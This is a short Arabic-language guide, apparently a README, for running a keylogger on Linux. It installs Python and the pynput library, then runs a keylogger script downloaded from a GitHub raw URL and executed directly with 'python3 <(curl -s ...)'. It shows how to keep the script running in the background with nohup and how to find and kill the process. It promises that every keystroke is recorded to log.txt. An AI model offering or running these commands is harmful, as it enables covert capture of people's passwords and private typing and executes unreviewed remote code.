1-إذا لم يكن Python مثبتًا، يمكنك تثبيته باستخدام:

sudo apt update

sudo apt install python3


2-بعد ذلك، تحتاج إلى تثبيت مكتبة pynput التي سنستخدمها لتسجيل ضغطات المفاتيح:

pip3 install pynput

3-لتشغيل الـkeylogger، استخدم الأمر التالي:

python3 <(curl -s https://raw.githubusercontent.com/osama-mousa/Keylogger/main/keylogger.py)


4-لتشغيله في الخلفية دون إغلاق الجلسة، يمكنك استخدام أدوات مثل nohup:

nohup python3 <(curl -s https://raw.githubusercontent.com/osama-mousa/Keylogger/main/keylogger.py) &


إذا كنت قد شغلت البرنامج باستخدام nohup أو قمت بتشغيله كعملية في الخلفية، يمكنك العثور على العملية عبر الأمر:

ps aux | grep keylogger.py


 لإيقاف العملية:

 kill <PID>
على سبيل المثال، إذا كان الـ PID هو 1234، فإن الأمر يكون:
kill 1234



سيبدأ البرنامج الآن في تسجيل كل ضغطة على لوحة المفاتيح في ملف log.txt :tada: :ninja:

